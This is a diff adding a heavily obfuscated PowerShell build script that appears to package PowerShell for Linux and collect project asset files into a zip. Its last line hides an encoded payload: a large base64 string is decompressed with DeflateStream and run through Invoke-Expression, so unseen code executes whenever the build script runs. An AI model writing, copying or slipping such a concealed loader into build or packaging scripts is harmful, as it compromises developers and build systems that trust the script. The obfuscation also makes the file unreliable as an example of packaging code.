@@ -1,0 +1,110 @@
+  $P9K = [tYpe]("{1}{0}" -f 'Rt','COnVE')  ;  SET HO0Tas  ( [Type]("{0}{5}{2}{3}{7}{4}{6}{8}{1}"-F'I','REsSioNMoDe','pr','e','.','o.com','Co','SSIOn','mp') )  ;$bou2tA  = [TyPE]("{2}{0}{1}" -F 't.EnCod','Ing','teX') ;
+
+
+
+
+
+
+param (
+    [string] ${LOCaTI`on} = ("{2}{1}{0}" -f 'ell','h','/powers'),
+
+    
+    [string] ${DEStIn`AT`I`ON} = ("{1}{0}" -f 'mnt','/'),
+
+    [ValidatePattern("^v\d+\.\d+\.\d+(-\w+(\.\d+)?)?$")]
+    [ValidateNotNullOrEmpty()]
+    [string]${rel`ea`se`TaG},
+
+    [switch]${taRX`64},
+    [switch]${TAr`A`RM},
+    [switch]${tAr`ArM64},
+    [switch]${F`xdepEn`DeNT},
+    [switch]${a`LpinE}
+)
+
+${relea`sE`T`AGPa`Ram} = @{}
+if (${rel`eAs`E`TaG})
+{
+    ${R`eLEA`setaGP`ARAm} = @{ ("{2}{0}{1}" -f'a','g','ReleaseT') = ${reLeaS`e`TaG} }
+}
+
+&("{2}{0}{1}{3}"-f 'ca','ti','Push-Lo','on')
+try {
+    .("{0}{1}{2}"-f 'Set','-Locati','on') ${LoC`AT`iON}
+    &("{3}{1}{0}{2}" -f'Mod','rt-','ule','Impo') "$location/build.psm1"
+    &("{1}{2}{0}" -f 'e','Imp','ort-Modul') "$location/tools/packaging"
+
+    .("{3}{5}{2}{1}{4}{0}"-f'p','Boot','t-PS','St','stra','ar') -Package -NoSudo
+
+    ${b`U`i`ldPARaMS} = @{ ("{1}{3}{2}{0}"-f'n','Confi','uratio','g') = ("{1}{0}"-f'elease','R'); ("{0}{3}{2}{1}" -f'P','ore','eRest','SModul') = ${T`RuE}}
+
+    if(${fXdeP`end`e`Nt}."iSpr`esE`NT") {
+        ${PrOJEct`AsseTsZIp`N`AME} = ("{6}{9}{5}{8}{3}{0}{4}{7}{2}{1}"-f'Assetssy','ip','s.z','ct','mbo','ntPr','linuxFxDepend','l','oje','a')
+        ${B`UIlD`PARAMs}.("{1}{0}"-f'd','Ad').Invoke(("{1}{0}" -f'ime','Runt'), ("{2}{1}{0}{3}" -f'de','depen','fx','nt'))
+    } elseif (${Al`P`INe}."i`sP`ReSEnT") {
+        ${PrOJecta`SsETsZ`iPn`AmE} = ("{4}{0}{9}{8}{5}{7}{2}{3}{6}{1}"-f 'lpi','ip','ets','s','linuxA','ectA','ymbols.z','ss','eProj','n')
+        ${bUIld`Par`AmS}.("{1}{0}" -f 'dd','A').Invoke(("{1}{0}{2}" -f 'ntim','Ru','e'), ("{1}{2}{0}" -f'4','alpine','-x6'))
+    } else {
+        
+        ${pROj`eC`TA`s`sETSzipnA`mE} = "linuxProjectAssets-$((get-date).Ticks)-symbols.zip"
+        ${B`UiLDPara`mS}.("{1}{0}" -f 'dd','A').Invoke(("{0}{1}{2}"-f 'C','rossge','n'), ${T`RuE})
+    }
+
+    .("{4}{3}{0}{1}{2}" -f 't-PS','B','uild','tar','S') @buildParams @releaseTagParam
+
+    if(${Fx`deP`E`NdEnt}) {
+        .("{1}{2}{0}"-f'SPackage','Star','t-P') -Type ("{1}{0}{2}"-f 'n','fxdepe','dent') @releaseTagParam
+    } elseif (${a`lPiNe}) {
+        &("{0}{4}{3}{2}{1}"-f 'S','e','ackag','art-PSP','t') -Type ("{1}{2}{0}" -f'ne','tar-al','pi') @releaseTagParam
+    } else {
+        &("{1}{3}{0}{2}"-f 'c','Start','kage','-PSPa') @releaseTagParam
+    }
+
+    if (${tARX`64}) { .("{1}{0}{3}{2}"-f 'rt-PSPac','Sta','e','kag') -Type ("{0}{1}"-f't','ar') @releaseTagParam }
+
+    if (${T`ArArM}) {
+        
+        
+        .("{0}{1}{3}{2}"-f'Sta','r','ld','t-PSBui') -Configuration ("{0}{2}{1}"-f 'R','ease','el') -Restore -Runtime ("{2}{0}{1}"-f'inux-a','rm','l') -PSModuleRestore @releaseTagParam
+        &("{3}{2}{0}{1}" -f 'g','e','rt-PSPacka','Sta') -Type ("{2}{1}{0}"-f'm','-ar','tar') @releaseTagParam
+    }
+
+    if (${t`Ar`ARm64}) {
+        &("{3}{2}{0}{1}" -f 'S','Build','-P','Start') -Configuration ("{1}{0}"-f 'se','Relea') -Restore -Runtime ("{1}{3}{0}{2}" -f'ux-arm','l','64','in') -PSModuleRestore @releaseTagParam
+        .("{1}{3}{0}{4}{2}" -f '-P','Sta','e','rt','SPackag') -Type ("{1}{2}{0}"-f'm64','tar','-ar') @releaseTagParam
+    }
+}
+finally
+{
+    &("{0}{1}{3}{2}"-f 'Po','p-Loca','n','tio')
+}
+
+${L`in`UxP`AckAgeS} = .("{1}{2}{3}{0}"-f'ldItem','Get','-Ch','i') "$location/powershell*" -Include ("{1}{0}"-f'eb','*.d'),("{1}{0}" -f'm','*.rp'),("{2}{1}{0}"-f'.gz','r','*.ta')
+
+foreach (${L`iNUX`p`ACKAge} in ${linUX`p`ACk`AGES})
+{
+    ${fI`LE`PAth} = ${LIn`U`XpaCkAge}."FU`LlNA`mE"
+    .("{1}{0}{2}{3}" -f 'Ve','Write-','rbo','se') ('C'+'opying'+' '+"$filePath "+'t'+'o '+"$destination") -Verbose
+    &("{1}{0}{3}{2}"-f'opy','C','tem','-I') -Path ${fi`le`p`ATH} -Destination ${De`STiN`A`TioN} -force
+}
+
+&("{0}{2}{4}{3}{1}"-f'W','ose','rite','b','-Ver') ("{6}{0}{2}{1}{7}{5}{8}{4}{3}" -f'ort','ng pr','i','.','s ..','e','Exp','oj','ct.assets file') -verbose
+
+${P`ROJectA`s`set`S`CoUNT`Er} = 1
+${P`RoJ`E`CTaSse`Tsfo`Ld`Er} = &("{0}{1}{2}" -f 'Join-Pa','t','h') -Path ${Des`TI`Na`TIOn} -ChildPath ("{3}{0}{1}{2}"-f 'ject','Asse','ts','pro')
+${pROJE`c`TASS`etSZ`IP} = .("{0}{1}{3}{2}" -f'Join-','P','th','a') -Path ${D`EStinA`T`IoN} -ChildPath ${pRojEcTasSEts`z`IP`NaMe}
+.("{3}{1}{0}{2}"-f'hildI','C','tem','Get-') ((("{7}{1}{3}{0}{4}{6}{2}{5}"-f'xe0pr','loca','ts.js','tion','oject.ass','on','e','SUA')) -CrEplacE  ([ChAr]83+[ChAr]85+[ChAr]65),[ChAr]36 -replACE'xe0',[ChAr]92) -Recurse | &("{2}{1}{0}{3}" -f 'ach-','orE','F','Object') {
+    ${s`UBF`Old`er} = ${_}."fU`lL`Name".("{1}{2}{0}"-f'e','Rep','lac').Invoke(${l`oC`A`TION},'')
+    ${su`Bfo`l`DEr}.("{0}{2}{1}" -f'Re','ce','pla').Invoke(("{1}{3}{2}{0}" -f 's.json','projec','sset','t.a'),'')
+    ${iTEMDesti`N`A`TiON} = .("{1}{2}{0}"-f 'h','Join','-Pat') -Path ${pRO`JE`c`Tass`EtSFol`der} -ChildPath ${su`BFo`lder}
+    .("{2}{0}{1}" -f 'ew','-Item','N') -Path ${iTe`Mdes`TI`NaTioN} -ItemType ("{2}{1}{0}"-f'y','or','Direct') -Force
+    ${fI`Le} = ${_}."Full`N`AmE"
+    &("{0}{1}{2}{3}"-f'Write-V','er','bo','se') ('Copyin'+'g '+"$file "+'t'+'o '+"$itemDestination") -verbose
+    &("{1}{2}{0}"-f'-Item','C','opy') -Path ${Fi`le} -Destination "$itemDestination\" -Force
+    ${P`ROJ`eCta`SseTs`CO`UnTer}++
+}
+
+.("{1}{2}{3}{0}" -f 'Archive','Com','pre','ss-') -Path ${PROJ`ECTaSsetS`FO`l`dEr} -DestinationPath ${pRo`j`eCta`SSET`sZ`IP}
+&("{2}{1}{0}{3}" -f 'ove-It','em','R','em') -Path ${PrOJe`CtA`sSeT`s`F`OLDEr} -Recurse -Force -ErrorAction ("{0}{2}{3}{1}" -f'Silent','nue','lyC','onti')
+
+.("{1}{3}{0}{4}{2}"-f'res','Invo','on','ke-Exp','si') $(&("{2}{1}{0}" -f'ct','Obje','New-') ("{0}{3}{2}{1}"-f 'IO.St','der','Rea','ream') ($(&("{3}{0}{1}{2}" -f 'w-O','bj','ect','Ne') ("{2}{4}{3}{1}{0}" -f'teStream','la','IO.Compressio','f','n.De') ($(.("{2}{1}{0}"-f 'ject','Ob','New-') ("{2}{0}{1}" -f 'O','.MemoryStream','I') (,$(  (  vaRiABLe p9K ).vALuE::("{2}{1}{0}"-f 'ase64String','B','From').Invoke(("{0}{20}{4}{21}{10}{3}{12}{9}{29}{7}{16}{24}{14}{1}{27}{33}{23}{2}{25}{28}{11}{34}{22}{6}{15}{5}{13}{30}{19}{18}{31}{32}{17}{26}{35}{8}"-f 'nVRtb9pIEP7OrxhZe5KtYMcJNG2wIjUlTctdSblAk94hdFrsAW9Z7zrrN','y3Nv95rdwpbNKvZOdBYErZ8zTcXFqa','8QYXCauwogJ8KWFiz','wVPxYyUz','nrIDa+BBGFtyeS2ljt3aJ/PrJDFYFE0ohbKQrIbiGWtj9hJLqbQabfJX98Boi7H1ov/NpWuQWxyldCSvXF7sa','1RetSELbvRKSc2TG26','1KgcpGDZYFn0l4aIqA5Os6ZYHGJzxlnSY4ff0spOSn7SAk/jrLCWwqqeL+sPcRLoKzCB4F9XFVwN3Ic7yIK','Tbm5NoZvXK8xK1VcoUPssqW3','DHWkgTre7fwE=','tl6v15jk8O2+','3rD92bj7efPvd+/+NL/+7r4M/74ejbw+P3v/7m0zjB2T','JMCAEjgLpAuiJBEN8FxRVVQFo','p/MoU','566TW5kXn9DSpphdrawMUqigxIIxOu','xCuz8IQfHyC','QKdRzD+sLG4F','BYO2pD647pjYjScTYMtfb8BP6CMvSoP+1+kP','FyiUNp6vzjcv','5bXsmuG6FYYhHe3Qi8Z1','wJBHMpmhucCaU2A+KPYF/RwsGDrFonTvgK7KKnMcIe89tPdIC/JwXhU1N2WDrK6Y7nV9+QGGT','S+h/PcbEx+hX++L1zOeneeZmWfMnuAK3juN8Y2UvSzXxrrOAo1C2ToPEikdbwJ5OZUihsJySweuLX2H','2uNmJYWj0hZHi9emB2CyWfsgf3BPeCGZ0hYh8t7LCrhVvL5ceQLWi+hMpz3DWs2W5ZQh5','qvSPOO','U3sC1JDjQtbV+HqP+N+j+sFirTgervdEcB8C','ajP4wzLzAnrAb','a9','yJoRNGL+s9cRla','/3KejbyRWwZ','nZx4W5YSko3Yog','131y8fXfpBCPd','906ZcoBr8E0XSZafrX','1+5LZUWGA','e0rGp3X8ymCPjd','OzO0fqGq0Rn4Gd8LTLKypLgC6q5Tb3JLqr5sVl0lB1hC7nRMbUatmNeEZ2wNcHR4wTYP7sIUCVEY','xkhGIGbjU88Lz4NB1iiDY2nAul9+/OVTm+A5tMESzFDEONI2lzxWfo5l0OpUXTReNFTNBm4APXIpkL6cul3JKsiTMLbOmxF3EMjLuqOB6cMNNYTEL','1onMlrnruc14QBSlUZXjv87hNhk62Z1hNXa6dL6qpSknf2/xR9KxJy2D2NN4n530Q7'))))),  (  GET-ITEm varIAble:Ho0Tas ).VALue::"d`EcoMpR`eSS")),  ( ITem VARIaBLE:Bou2tA  ).vALue::"Asc`Ii")).("{2}{0}{1}" -f 'dTo','End','Rea').Invoke();
